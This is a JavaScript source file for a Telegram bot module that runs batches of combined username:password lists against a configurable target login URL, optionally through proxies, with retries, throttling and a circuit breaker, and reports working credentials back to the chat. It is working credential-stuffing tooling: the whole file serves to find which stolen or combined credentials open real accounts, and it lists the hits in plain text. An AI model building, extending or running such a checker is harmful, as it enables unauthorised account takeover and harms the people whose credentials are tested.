const { Markup } = require('telegraf');
const {
  DEFAULT_TTL_MS,
  initProcessedStore,
  getProcessedStatus,
  markProcessedStatus,
  isSkippableStatus,
  makeKey,
} = require('../automation/batch/processedStore');
const {
  escapeV2,
  codeV2,
  boldV2,
  spoilerCodeV2,
  formatDurationMs,
  buildBatchFailed,
} = require('./messages');
const { createLogger } = require('../logger');

const log = createLogger('combine-batch');

// Track active batches
const activeCombineBatches = new Map();

// Configuration
const BATCH_CONCURRENCY = Math.max(1, parseInt(process.env.BATCH_CONCURRENCY, 10) || 1);
const MAX_RETRIES = parseInt(process.env.BATCH_MAX_RETRIES, 10) || 1;
const REQUEST_DELAY_MS = parseInt(process.env.BATCH_DELAY_MS, 10) || 500;
const PROGRESS_UPDATE_INTERVAL_MS = 2000;
const ERROR_THRESHOLD_PERCENT = 60;
const ERROR_WINDOW_SIZE = 5;
const CIRCUIT_BREAKER_PAUSE_MS = 3000;
const PROCESSED_TTL_MS = parseInt(process.env.PROCESSED_TTL_MS, 10) || DEFAULT_TTL_MS;

/**
 * Filter already processed credentials
 */
async function filterAlreadyProcessed(creds) {
  await initProcessedStore(PROCESSED_TTL_MS);
  const filtered = [];
  let skipped = 0;

  for (const cred of creds) {
    const key = makeKey(cred.username, cred.password);
    const status = getProcessedStatus(key, PROCESSED_TTL_MS);
    if (status && isSkippableStatus(status)) {
      skipped += 1;
      continue;
    }
    filtered.push({ ...cred, _dedupeKey: key });
  }

  return { filtered, skipped };
}

/**
 * Build progress message
 */
function buildCombineBatchProgress({ processed, total, counts, validCreds = [] }) {
  const pct = total > 0 ? Math.round((processed / total) * 100) : 0;
  const bar = '█'.repeat(Math.floor(pct / 10)) + '░'.repeat(10 - Math.floor(pct / 10));
  
  const parts = [];
  parts.push(`⏳ ${boldV2('Processing Combined Batch...')}`);
  parts.push('');
  parts.push(`${escapeV2(bar)} ${codeV2(`${pct}%`)}`);
  parts.push(`${codeV2(`${processed}/${total}`)} credentials`);
  parts.push('');
  parts.push(`✅ ${codeV2(String(counts.VALID || 0))} ❌ ${codeV2(String(counts.INVALID || 0))} 🔒 ${codeV2(String(counts.BLOCKED || 0))} ⚠️ ${codeV2(String(counts.ERROR || 0))}`);
  
  if (validCreds && validCreds.length > 0) {
    parts.push('');
    parts.push(boldV2('💎 Valid Found:'));
    validCreds.slice(0, 10).forEach((cred) => {
      parts.push(`• ${codeV2(`${cred.username}:${cred.password}`)}`);
    });
    if (validCreds.length > 10) {
      parts.push(`• ${boldV2(`...and ${validCreds.length - 10} more`)}`);
    }
  }
  
  return parts.join('\n');
}

/**
 * Build summary message
 */
function buildCombineBatchSummary({ filename, total, skipped, counts, elapsedMs, validCreds }) {
  const parts = [];
  
  parts.push(`📊 ${boldV2('COMBINE BATCH COMPLETE')}`);
  parts.push('');
  
  parts.push(boldV2('📈 Statistics'));
  parts.push(`├ Source: ${codeV2(filename)}`);
  parts.push(`├ Total: ${codeV2(String(total))}`);
  if (skipped) {
    parts.push(`├ Skipped: ${codeV2(String(skipped))}`);
  }
  parts.push(`└ Time: ${codeV2(formatDurationMs(elapsedMs))}`);
  parts.push('');
  
  parts.push(boldV2('📋 Results'));
  parts.push(`├ ✅ Valid: ${codeV2(String(counts.VALID || 0))}`);
  parts.push(`├ ❌ Invalid: ${codeV2(String(counts.INVALID || 0))}`);
  parts.push(`├ 🔒 Blocked: ${codeV2(String(counts.BLOCKED || 0))}`);
  parts.push(`└ ⚠️ Error: ${codeV2(String(counts.ERROR || 0))}`);
  
  if (validCreds && validCreds.length > 0) {
    parts.push('');
    parts.push(boldV2('🔐 Valid Credentials'));
    validCreds.forEach((cred, i) => {
      const prefix = i === validCreds.length - 1 ? '└' : '├';
      parts.push(`${prefix} ${spoilerCodeV2(`${cred.username}:${cred.password}`)}`);
    });
  }

  return parts.join('\n');
}

/**
 * Build aborted message
 */
function buildCombineBatchAborted({ filename, total, processed }) {
  return (
    escapeV2('⏹️ Combine batch aborted') +
    `\nSource: ${codeV2(filename)}` +
    `\nProcessed: *${processed}/${total}*`
  );
}

/**
 * Run batch execution for combined files
 */
async function runCombineBatch(ctx, batch, options, helpers, checkCredentials) {
  const chatId = ctx.chat.id;
  
  // Filter already processed
  const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
  
  if (!filtered.length) {
    await ctx.reply(escapeV2('ℹ️ All credentials from combined files were already processed.'), {
      parse_mode: 'MarkdownV2',
    });
    return;
  }
  
  const batchData = {
    creds: filtered,
    filename: batch.filename,
    count: filtered.length,
    skipped,
    aborted: false,
  };
  
  // Create promise to track batch completion
  let batchCompleteResolve;
  batchData._completionPromise = new Promise(resolve => {
    batchCompleteResolve = resolve;
  });
  
  // Send starting message
  const statusMsg = await ctx.reply(
    escapeV2('⏳ Starting combined batch check') +
    `\nSource: ${codeV2(batch.filename)}` +
    `\nEntries: *${escapeV2(String(filtered.length))}*` +
    `\nSkipped \\(24h\\): *${escapeV2(String(skipped))}*`,
    {
      parse_mode: 'MarkdownV2',
      ...Markup.inlineKeyboard([[Markup.button.callback('⏹ Abort', `combine_abort_${chatId}`)]]),
    }
  );
  
  // Track active batch
  activeCombineBatches.set(chatId, batchData);
  
  const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
  let processed = 0;
  const validCreds = [];
  const startedAt = Date.now();
  let lastProgressAt = startedAt;
  
  const recentResults = [];
  let circuitBreakerTripped = false;

  log.info(`[combine-batch] starting total=${filtered.length} concurrency=${BATCH_CONCURRENCY}`);

  const updateProgress = async (force = false) => {
    if (batchData.aborted) return;
    
    const now = Date.now();
    if (!force && now - lastProgressAt < PROGRESS_UPDATE_INTERVAL_MS) return;
    
    lastProgressAt = now;
    
    const text = buildCombineBatchProgress({
      processed,
      total: batchData.count,
      counts,
      validCreds,
    });

    try {
      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
        parse_mode: 'MarkdownV2',
      });
    } catch (err) {
      if (!err.message?.includes('message is not modified')) {
        log.debug(`Progress update failed: ${err.message}`);
      }
    }
  };

  const checkCircuitBreaker = () => {
    if (recentResults.length < ERROR_WINDOW_SIZE) return false;
    
    const errorCount = recentResults.filter(r => r === 'ERROR').length;
    const errorRate = (errorCount / recentResults.length) * 100;
    
    if (errorRate >= ERROR_THRESHOLD_PERCENT) {
      if (!circuitBreakerTripped) {
        circuitBreakerTripped = true;
        log.warn(`[combine-batch] Circuit breaker: ${errorRate.toFixed(0)}% errors - pausing`);
      }
      return true;
    }
    
    circuitBreakerTripped = false;
    return false;
  };

  const processCredential = async (cred) => {
    if (batchData.aborted) return;
    
    if (checkCircuitBreaker()) {
      await new Promise(r => setTimeout(r, CIRCUIT_BREAKER_PAUSE_MS));
      recentResults.length = 0;
    }
    
    let result;
    const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
    
    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
      if (batchData.aborted) return;
      
      try {
        result = await checkCredentials(cred.username, cred.password, {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        });
      } catch (err) {
        result = { status: 'ERROR', message: err.message };
      }
      
      if (result.status !== 'ERROR' || attempt >= MAX_RETRIES) break;
      
      log.debug(`[combine-batch] Retry ${cred.username} (${attempt + 2}/${MAX_RETRIES + 1})`);
      await new Promise(r => setTimeout(r, (500 * Math.pow(2, attempt)) + Math.random() * 300));
    }

    recentResults.push(result.status);
    if (recentResults.length > ERROR_WINDOW_SIZE) recentResults.shift();

    counts[result.status] = (counts[result.status] || 0) + 1;
    processed += 1;

    if (result.status === 'VALID') {
      validCreds.push({ username: cred.username, password: cred.password });
    }

    markProcessedStatus(credKey, result.status, PROCESSED_TTL_MS).catch(() => {});
    
    return result;
  };

  const processInChunks = async () => {
    const allCreds = batchData.creds;
    const chunkSize = BATCH_CONCURRENCY;
    
    for (let i = 0; i < allCreds.length; i += chunkSize) {
      if (batchData.aborted) break;
      
      if (checkCircuitBreaker()) {
        await new Promise(r => setTimeout(r, CIRCUIT_BREAKER_PAUSE_MS));
        recentResults.length = 0;
      }
      
      const chunk = allCreds.slice(i, i + chunkSize);
      
      if (chunkSize === 1) {
        await processCredential(chunk[0]);
      } else {
        await Promise.all(chunk.map(cred => processCredential(cred)));
      }
      
      await updateProgress(true);
      
      if (i + chunkSize < allCreds.length && REQUEST_DELAY_MS > 0) {
        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
      }
    }
  };

  try {
    await processInChunks();

    const elapsed = Date.now() - startedAt;
    const summary = batchData.aborted
      ? buildCombineBatchAborted({ filename: batchData.filename, total: batchData.count, processed })
      : buildCombineBatchSummary({
          filename: batchData.filename,
          total: batchData.count,
          skipped: batchData.skipped || 0,
          counts,
          elapsedMs: elapsed,
          validCreds,
        });

    try {
      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
        parse_mode: 'MarkdownV2',
      });
    } catch (err) {
      log.warn('Summary edit failed:', err.message);
      await ctx.reply(summary, { parse_mode: 'MarkdownV2' });
    }

    log.info(
      `[combine-batch] finished aborted=${!!batchData.aborted} processed=${processed}/${batchData.count} ` +
      `valid=${counts.VALID} invalid=${counts.INVALID} blocked=${counts.BLOCKED} error=${counts.ERROR} elapsed_ms=${elapsed}`
    );
  } catch (err) {
    try {
      await ctx.reply(buildBatchFailed(err.message), { parse_mode: 'MarkdownV2' });
    } catch (_) {}
    log.warn(`[combine-batch] execution failed: ${err.message}`);
  } finally {
    activeCombineBatches.delete(chatId);
    batchCompleteResolve(); // Signal batch completion
  }
}

/**
 * Abort active combine batch
 */
function abortCombineBatch(chatId) {
  const batch = activeCombineBatches.get(chatId);
  if (batch) {
    batch.aborted = true;
    log.info(`[combine-batch] abort requested chatId=${chatId}`);
    return true;
  }
  return false;
}

/**
 * Check if combine batch is active
 */
function hasCombineBatch(chatId) {
  return activeCombineBatches.has(chatId);
}

/**
 * Get active combine batch for a chat
 */
function getActiveCombineBatch(chatId) {
  return activeCombineBatches.get(chatId);
}

module.exports = {
  runCombineBatch,
  abortCombineBatch,
  hasCombineBatch,
  getActiveCombineBatch,
};
